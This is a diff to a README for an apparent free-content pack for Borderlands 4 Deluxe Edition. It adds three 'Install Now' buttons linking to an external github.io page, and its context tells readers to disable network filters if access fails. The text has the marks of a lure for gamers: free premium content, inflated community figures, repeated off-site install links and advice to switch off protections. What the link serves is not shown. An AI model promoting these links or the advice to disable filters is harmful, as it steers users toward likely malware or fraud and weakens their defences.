@@ -6,9 +6,10 @@
 
 **About Borderlands4FreePack**: Borderlands4FreePack is a repository for *Borderlands 4 Deluxe Edition* players on Windows, offering free community-crafted skins, gameplay tweaks, and tools. Elevate your Kairos loot-hunting adventure with customizations. With 140K+ visitors and 110K+ members, dive into the action today! (275 characters)
 
- 
+<a href="https://borderlandsvault.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
----
 
 ## 🚀 Getting Started
 
@@ -20,9 +21,10 @@ Enhance your *Borderlands 4 Deluxe Edition* with **Borderlands4FreePack** on Win
 2. **Resolve Access Issues** 🌐  
    Disable network filters or try browsers like Edge or Firefox if needed.
 
- 
+<a href="https://borderlandsvault.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
----
 
 ## 🛠 Why Borderlands4FreePack?
 
@@ -33,7 +35,10 @@ Enhance your *Borderlands 4 Deluxe Edition* with **Borderlands4FreePack** on Win
 - 🤝 **Active Community**: Connect with 110K+ members.  
 - 📅 **Regular Updates**: New tools for your adventure.
 
----
+<a href="https://borderlandsvault.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
+
 
 ## 🎮 Enhancement Scenarios
 
@@ -77,7 +82,7 @@ Enhance your *Borderlands 4 Deluxe Edition* with **Borderlands4FreePack** on Win
 *Intuitive enhancement dashboard.*
 
 **Tool Features**  
-![Features](https://i.playground.ru/e/r3I5ln2fsXbB2y52cmRXBw.png)  
+![Features](https://img.gg.deals/da/e0/87a7d28502b92074aaacae01ce1b0ce2eab1_1232xr706_Q100.jpg)  
 *Showcase enhanced Borderlands 4 tools.*
 
 ---
